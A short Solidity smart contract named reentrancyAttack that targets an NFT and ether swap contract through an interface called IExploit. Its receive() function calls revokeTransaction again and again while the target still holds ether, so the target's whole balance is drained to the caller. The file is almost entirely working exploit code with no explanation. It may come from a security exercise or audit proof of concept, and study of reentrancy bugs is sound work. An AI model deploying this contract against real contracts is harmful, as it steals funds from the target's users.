// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IExploit {
    function createTransaction(
        address _receiver,
        address _myNFT,
        address _wantNFT,
        uint256 _myToken,
        uint256 _wantToken,
        uint256 _dueDate,
        uint256 _myETH,
        uint256 _wantETH
    ) external payable;

    function revokeTransaction(uint256 _transactionId) external;
}

contract reentrancyAttack {
    constructor (IExploit _exploit) {
        exploit = _exploit;
    }

    IExploit private exploit;
    uint256 private transactionId;

    function createTransactionExploit(address _receiver, address _myNFT, address _wantNFT, uint256 _myToken, uint256 _wantToken, uint256 _myETH, uint256 _wantETH) external payable {
        exploit.createTransaction(_receiver, _myNFT, _wantNFT, _myToken, _wantToken, 3 days, _myETH, _wantETH);
    }

    function drainETH(uint256 _transactionId) public {
        transactionId = _transactionId;
        exploit.revokeTransaction(transactionId);

        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "draining ETH failed");
    }

    receive() external payable {
        if (address(exploit).balance > 0) {
            drainETH(transactionId);
        }
    }

    fallback() external payable {
        
    }
}